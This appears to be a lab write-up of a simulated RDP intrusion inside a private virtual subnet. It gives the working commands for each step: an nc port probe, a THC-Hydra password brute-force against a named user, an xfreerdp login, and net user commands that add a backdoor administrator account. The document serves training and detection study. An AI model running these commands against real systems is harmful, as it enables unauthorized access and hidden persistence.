# Step-by-Step Attack Simulation Guide
This document provides a comprehensive, step-by-step breakdown of how the target infrastructure was audited, attacked, and compromised from an adversary's perspective. 

---

## 🖥️ Environment Configuration
To maintain safety and isolation, all emulation activities were contained within a private internal virtual subnet:

* **Attacker Machine:** Kali Linux
  * **IP Address:** `192.168.100.1`
* **Target Endpoint Machine:** Windows 10 Enterprise
  * **IP Address:** `192.168.100.2`
  * **Target Service:** Remote Desktop Protocol (RDP) on TCP Port 3389

---

## 🛠️ Execution Steps

### Step 1: Active Reconnaissance & Port Verification
Before launching a noisy brute-force attack, an active network probe was executed from Kali Linux. This verification step ensured the RDP service socket was exposed and actively listening, bypassing standard network blindspots since the **Windows Defender Firewall had been completely disabled** for this scenario.

```bash
nc -zv 192.168.100.2 3389
```
**Expected Output Response:**
```text
192.168.100.2: inverse host lookup failed: Unknown host
(UNKNOWN) 3389 (ms-wbt-server) open
```

---

### Step 2: Automated Dictionary Brute-Force
With Port 3389 confirmed open, a targeted dictionary attack was launched against the known valid local user profile `Finn`. Utilizing a custom password list (`passwordset.txt`) via `THC-Hydra`, the engine systematically sprayed the credentials to identify an authentication vulnerability.

```bash
hydra -l Finn -P /home/arijit/Desktop/passwordset.txt -t 1 -w 2 rdp://192.168.100.2 -f -V
```
<img width="991" height="466" alt="image" src="https://github.com/user-attachments/assets/a4a3cf2d-f557-40eb-8b90-1d17219f2602" />

* **Throttling Parameters (`-t 1 -w 2`):** Applied precisely to ensure connection stability and prevent crashing the target's network interface stack.
* **Result:** The tool parsed the list and successfully harvested the correct matching credential, halting execution immediately via the `-f` flag.

---

### Step 3: Interactive Initial Access Breach
Upon discovering the valid working credentials for `Finn`, the attack shifted from automated scripting to a live interactive session. Using the native Linux RDP client `xfreerdp`, a successful connection request was sent to spawn a full graphical desktop user interface.

```bash
xfreerdp /v:192.168.100.2 /u:Finn /p:CorrectPassword! /dynamic-resolution /cert:ignore
```
<img width="788" height="332" alt="image" src="https://github.com/user-attachments/assets/fc4fd594-a6ac-4775-ae74-2ee81e55882f" />

* **Outcome:** This action bypasses standard automated boundaries, establishes a graphical interactive desktop terminal shell, and logs a distinct **Logon Type 10** footprint within the endpoint security kernel database.

---

### Step 4: Establishing Persistence via Backdoor Account
To ensure long-term control and avoid losing access, an administrative backdoor was immediately established. This security redundancy guarantees that even if the primary user `Finn` detects an anomaly and changes his password, the attacker can cleanly re-enter the network at any point.

An elevated Command Prompt (`cmd.exe`) was spawned within the active RDP session to execute local user provisioning and privilege manipulation:

```cmd
net user attacker_backdoor MaliciousPass123! /add
net localgroup administrators attacker_backdoor /add
```
<img width="850" height="201" alt="image" src="https://github.com/user-attachments/assets/8fda20b4-7721-4694-b5b0-ca56daab888e" />

* **Mechanics:** A hidden secondary profile named `attacker_backdoor` was injected into the host system and elevated to the local `Administrators` security group, completing the post-compromise persistence phase.

